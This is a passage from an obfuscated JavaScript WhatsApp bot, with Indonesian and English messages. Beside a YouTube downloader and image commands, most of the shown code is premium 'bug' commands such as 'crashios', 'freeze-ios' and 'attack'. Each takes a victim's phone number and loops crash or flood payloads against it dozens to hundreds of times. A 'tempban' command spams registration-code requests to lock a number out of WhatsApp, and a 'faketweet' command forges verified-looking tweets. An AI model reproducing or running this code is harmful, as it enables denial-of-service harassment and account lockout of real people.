              const _0x5d557 = {
                format: _0x160cd4
              };
              _0x1d2ba6(_0x12a240, _0x5d557).pipe(_0x183739.createWriteStream(_0x2c2a8b)).on("finish", _0x532a4c).on("error", _0x142c16);
            });
            await new Promise((_0x144d60, _0x19f1b8) => {
              const _0x43c70f = {
                format: _0x41a0d8
              };
              _0x1d2ba6(_0x12a240, _0x43c70f).pipe(_0x183739.createWriteStream(_0x3511de)).on("finish", _0x144d60).on("error", _0x19f1b8);
            });
            await new Promise((_0x122a50, _0x8d80af) => {
              _0x18690f("ffmpeg -i " + _0x2c2a8b + " -i " + _0x3511de + " -c:v copy -c:a aac " + _0x2cf8c6, (_0x35e01b, _0x50888a, _0x144cb0) => {
                if (_0x35e01b) {
                  _0x8d80af(new Error("ffmpeg error: " + _0x35e01b.message));
                  return;
                }
                _0x122a50();
              });
            });
            await _0x183739.promises.unlink(_0x2c2a8b);
            await _0x183739.promises.unlink(_0x3511de);
            const {
              videoDetails: _0x5b80ee
            } = _0x5be32a;
            const _0x5374a1 = _0x5be32a.formats.filter(_0x1353b3 => _0x1353b3.hasVideo && _0x1353b3.height).map(_0x1d630a => _0x1d630a.height).filter((_0x39b3f5, _0x55edfa, _0x40b7ba) => _0x40b7ba.indexOf(_0x39b3f5) === _0x55edfa).sort((_0x57dba3, _0xbddaed) => _0xbddaed - _0x57dba3);
            const _0x1170a1 = new Date(_0x5b80ee.lengthSeconds * 1000).toISOString().substr(11, 8);
            const _0x7808b8 = {
              outputPath: _0x2cf8c6,
              videoDetails: _0x5b80ee,
              resolution: _0x160cd4.height,
              resolutions: _0x5374a1,
              duration: _0x1170a1
            };
            return _0x7808b8;
          };
          if (!_0x1d2ba6.validateURL(_0x2e14fb)) {
            return _0x3b9923("URL YouTube tidak valid. Pastikan URL diawali dengan http:// atau https://");
          }
          try {
            const _0x167f5d = _0x58d519 ? parseInt(_0x58d519, 10) : null;
            if (_0x167f5d && isNaN(_0x167f5d)) {
              return _0x3b9923("Resolusi tidak valid. Harap masukkan resolusi dalam angka, misalnya: 720 atau 360.");
            }
            const {
              outputPath: _0x2296e8,
              videoDetails: _0x32f38d,
              resolution: _0x455417,
              resolutions: _0x1b08b6,
              duration: _0x3745ca
            } = await _0x9cf7a3(_0x2e14fb, _0x167f5d);
            const _0x364a3a = _0x452997(_0x2296e8);
            if (_0x364a3a > 5368709120) {
              return _0x3b9923("File terlalu besar untuk dikirim. Maksimum ukuran file adalah 5 GB.");
            }
            if (_0x364a3a > 1610612736) {
              return _0x3b9923("File melebihi batas 1.5 GB.");
            }
            if (_0x364a3a <= 104857600) {
              const _0x1130fa = {
                url: _0x2296e8
              };
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
                video: _0x1130fa,
                mimetype: "video/mp4",
                fileName: _0x32f38d.title + ".mp4",
                caption: "YTMP4 DOWNLOADER resolusi " + _0x455417 + "p\n\n*Judul:* " + _0x32f38d.title + "\n*Deskripsi:* " + _0x32f38d.description + "\n*Nama Pengupload:* " + _0x32f38d.author.name + "\n*Jumlah Views:* " + _0x32f38d.viewCount + "\n*Durasi:* " + _0x3745ca + "\n*Resolusi yang Tersedia:* " + _0x1b08b6.join(", ") + "p"
              }, {
                quoted: _0x21f0d9
              });
            } else {
              const _0x39d04b = {
                url: _0x2296e8
              };
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
                document: _0x39d04b,
                mimetype: "video/mp4",
                fileName: _0x32f38d.title + ".mp4",
                caption: "YTMP4 DOWNLOADER resolusi " + _0x455417 + "p\n\n*Judul:* " + _0x32f38d.title + "\n*Deskripsi:* " + _0x32f38d.description + "\n*Nama Pengupload:* " + _0x32f38d.author.name + "\n*Jumlah Views:* " + _0x32f38d.viewCount + "\n*Durasi:* " + _0x3745ca + "\n*Resolusi yang Tersedia:* " + _0x1b08b6.join(", ") + "p"
              }, {
                quoted: _0x21f0d9
              });
            }
            await _0x183739.promises.unlink(_0x2296e8);
          } catch (_0xf0d643) {
            console.error("Error downloading video:", _0xf0d643);
            _0x3b9923("Terjadi kesalahan saat mengunduh video: " + _0xf0d643.message, _0x21f0d9);
          }
        }
        break;
      case "waifu":
        {
          const _0x5f2d63 = await _0x53139d("https://pic.re/image.json");
          const _0x93cab2 = "https://" + _0x5f2d63.file_url;
          const _0x510961 = {
            url: _0x93cab2
          };
          const _0x5a3df6 = {
            image: _0x510961,
            caption: "Size: " + _0x5f2d63.file_size
          };
          const _0x3b4eae = {
            quoted: _0x21f0d9
          };
          _0x4b53e5.sendMessage(_0x22a0dd, _0x5a3df6, _0x3b4eae);
        }
        break;
      case "faketweet":
        {
          const _0x27af1f = require("canvafy");
          if (!_0x40d288) {
            return _0x3b9923("Exmaple : Name1 | Name2 | Text");
          }
          nama1 = _0x40d288.split("|")[0];
          nama2 = _0x40d288.split("|")[1];
          katakata = _0x40d288.split("|")[2];
          const _0x433dd2 = {
            displayName: name1,
            username: name2
          };
          const _0x11d9a0 = await new _0x27af1f.Tweet().setTheme("dim").setUser(_0x433dd2).setVerified(true).setComment(katakata).setAvatar(ppnyauser).build();
          let _0x2b826b = _0x11d9a0;
          const _0x2423ca = {
            image: _0x2b826b,
            caption: "Done Desuu~"
          };
          _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x2423ca, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "txt2img":
        {
          if (!_0x40d288) {
            return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " cat");
          }
          async function _0x2c4fea(_0x152c19) {
            try {
              let _0x4db308 = [];
              for (let _0x1f288b = 0; _0x1f288b < 3; _0x1f288b++) {
                let {
                  data: _0x385571
                } = await axios.get("https://tti.photoleapapp.com/api/v1/generate?prompt=" + _0x152c19);
                _0x4db308.push(_0x385571.result_url);
              }
              return _0x4db308;
            } catch (_0x23b400) {
              return {
                msg: 404
              };
            }
          }
          let _0x112419 = await _0x2c4fea(_0x40d288);
          for (const _0x27b1c3 of _0x112419) {
            const _0x359330 = {
              url: _0x27b1c3
            };
            const _0x4748d2 = {
              image: _0x359330,
              caption: "Done"
            };
            _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x4748d2, {
              quoted: _0x21f0d9
            });
          }
        }
        break;
      case "stuk":
      case "flow":
        if (!_0x2054ca) {
          return _0x5297c5(mess.only.premium);
        }
        if (!q) {
          return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
        }
        let {
          proto: _0xda26e2,
          generateWAMessageFromContent: _0x770315
        } = require("@whiskeysockets/baileys");
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0x478984 = 0; _0x478984 < 50; _0x478984++) {
          await _0x5c5ebc(_0x4b53e5, target, "", 1020000, ptcp = true);
          _0x251533(target, _0x327dba);
          await _0x251533(target, _0x327dba);
          await _0x239b9c(_0x4b53e5, target, _0x327dba);
          await _0xcb3ebe(target, _0x327dba);
          await _0x2e843e(_0x4b53e5, target, _0x327dba);
          darkphonk = _0x4d1a4f.readFileSync("./marx/menu.mp3");
        }
        _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆");
        const _0x248551 = {
          audio: darkphonk,
          mimetype: "audio/mp4",
          ptt: true
        };
        await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x248551, {
          quoted: _0x21f0d9
        });
        break;
      case "fuck":
      case "tzy":
        if (!_0x2054ca) {
          return _0x5297c5(mess.only.premium);
        }
        if (!q) {
          return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0x39e321 = 0; _0x39e321 < 50; _0x39e321++) {
          await _0x5c5ebc(_0x4b53e5, target, "", 1020000, ptcp = true);
          _0x251533(target, _0x327dba);
          await _0x251533(target, _0x327dba);
          await _0x239b9c(_0x4b53e5, target, _0x327dba);
          await _0xcb3ebe(target, _0x327dba);
          await _0x2e843e(_0x4b53e5, target, _0x327dba);
        }
        _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
        break;
      case "neww":
      case "tzxy":
        if (!_0x2054ca) {
          return _0x5297c5(mess.only.premium);
        }
        if (!q) {
          return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 234×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0x18e56f = 0; _0x18e56f < 50; _0x18e56f++) {
          await _0x5c5ebc(_0x4b53e5, target, "", 1020000, ptcp = true);
          _0x251533(target, _0x327dba);
          await _0x251533(target, _0x327dba);
          await _0x239b9c(_0x4b53e5, target, _0x327dba);
          await _0xcb3ebe(target, _0x327dba);
          await _0x2e843e(_0x4b53e5, target, _0x327dba);
          _0x251533(target, _0x327dba);
          await _0x251533(target, _0x327dba);
          await _0x239b9c(_0x4b53e5, target, _0x327dba);
          await _0xcb3ebe(target, _0x327dba);
          await _0x2e843e(_0x4b53e5, target, _0x327dba);
          await _0x109881(target);
          await _0x109881(target);
          await _0x109881(target);
          await _0x109881(target);
          await _0x109881(target);
          await _0x109881(target);
          await _0x109881(target);
          await _0x109881(target);
          await _0x109881(target);
        }
        _0x3b9923("『 `𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒` 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
        break;
      case "xiods":
      case "xifp":
      case "iphonetest":
        {
          if (!q) {
            return _0x3b9923("Example:\n " + (_0x3a5987 + _0x4ae68c) + " 234xxxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x3b9923(mess.bugrespon);
          await _0x5c5ebc(_0x4b53e5, target, "𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕", 1020000, ptcp = true);
          await _0x41cec1(target, _0x48b0ff);
          await _0x2e843e(_0x4b53e5, target, _0x48b0ff);
          await _0x239b9c(_0x4b53e5, target, _0x48b0ff);
        }
        _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
        break;
      case "vip":
      case "attack":
      case "andro":
        if (!_0x2054ca) {
          return _0x5297c5(mess.only.premium);
        }
        if (!q) {
          return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0x37350b = 0; _0x37350b < 30; _0x37350b++) {
          await _0x5c5ebc(_0x4b53e5, target, "", 1020000, ptcp = true);
          _0x251533(target, _0x327dba);
          await _0x251533(target, _0x327dba);
          await _0x239b9c(_0x4b53e5, target, _0x327dba);
          await _0xcb3ebe(target, _0x327dba);
          await _0x2e843e(_0x4b53e5, target, _0x327dba);
        }
        _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
        break;
      case "crashios":
      case "killios":
      case "trashios":
        if (!_0x2054ca) {
          return _0x5297c5(mess.only.premium);
        }
        if (!q) {
          return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0x4ecf4a = 0; _0x4ecf4a < 40; _0x4ecf4a++) {
          await _0x5c5ebc(_0x4b53e5, target, "", 1020000, ptcp = true);
          await _0x251533(target, _0x327dba);
          await _0x239b9c(_0x4b53e5, target, _0x327dba);
          await _0xcb3ebe(target, _0x327dba);
          await _0x2e843e(_0x4b53e5, target, _0x327dba);
        }
        _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
        break;
      case "xxx":
      case "leorcrash":
      case "crashflow":
        if (!_0x2054ca) {
          return _0x5297c5(mess.only.premium);
        }
        if (!q) {
          return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0xa3709d = 0; _0xa3709d < 40; _0xa3709d++) {
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
        }
        _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
        break;
      case "tempban":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 234|8xxx");
          }
          if (!/|/.test(_0x40d288)) {
            return _0x3b9923("Stupid it's like this \n " + (_0x3a5987 + _0x4ae68c) + " 234|8626648282");
          }
          let _0x566452 = JSON.parse(_0x4d1a4f.readFileSync("./lib/tempban/ban.json"));
          let _0x58561f = q.split("|")[0];
          let _0x22d4d1 = q.split("|")[1];
          let _0x22d5fc = _0x58561f + _0x22d4d1;
          await _0x3b9923("Success! Registration Interruption has been successfully activated to the target : " + _0x22d5fc + " for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.");
          let {
            state: _0x5d0e4a
          } = await useMultiFileAuthState("tempban");
          let _0x2f0b3a = makeWASocket({
            auth: _0x5d0e4a,
            mobile: true,
            logger: pino({
              level: "silent"
            })
          });
          let _0x1af26b = async () => {
            try {
              let _0x4f1f3c = await _0x2f0b3a.requestRegistrationCode({
                phoneNumber: "+" + _0x22d5fc,
                phoneNumberCountryCode: _0x58561f,
                phoneNumberNationalNumber: _0x22d4d1,
                phoneNumberMobileCountryCode: 724
              });
              if (_0x4f1f3c.reason === "temporarily_unavailable") {
                console.log("Invalid Number (Possibility of Interrupted Registration): +" + _0x4f1f3c.login);
                await _0x96020a(100);
                await _0x1af26b();
              }
            } catch (_0x1f989f) {}
          };
          const _0x3bdb78 = {
            cCode: _0x58561f,
            number: _0x22d4d1
          };
          _0x566452[_0x22d5fc] = _0x3bdb78;
          _0x4d1a4f.writeFileSync("./lib/tempban/ban.json", JSON.stringify(_0x566452, null, "\t"));
          setInterval(() => {
            _0x1af26b();
          }, 400);
        }
        break;
      case "freeze-ios":
      case "iphssddone":
      case "xidddddp":
        if (!q) {
          return _0x3b9923("\n 𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\nExample: " + (_0x3a5987 + _0x4ae68c) + " 234×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        const _0x583b5c = [_0x2f7ba8, _0xe3a42f];
        for (let _0x6975f7 = 0; _0x6975f7 < 50; _0x6975f7++) {
          for (const _0x44a0df of _0x583b5c) {
            await _0x44a0df(target, Ptcp = true);
          }
        }
        _0x3b9923("「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」\n  💧⃟𒆜𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕⃟╳🐦‍🔥\n│──▄────▄▄▄▄▄▄▄────▄───│\n│─▀▀▄─▄█████████▄─▄▀▀──│\n│─────██─▀███▀─██──────│\n│───▄─▀████▀████▀─▄────│\n│─▀█────██▀█▀██────█▀──│\n│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : " + target + " ༂         \n│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : " + _0x4ae68c + " ༂\n│\n╚─────「 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 」──");
        break;
      case "chucky-ios":
      case "iphddone":
      case "xidddp":
        if (!q) {
          return _0x3b9923("\n 𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\nExample: " + (_0x3a5987 + _0x4ae68c) + " 234×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0x363c6b = 0; _0x363c6b < 40; _0x363c6b++) {
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
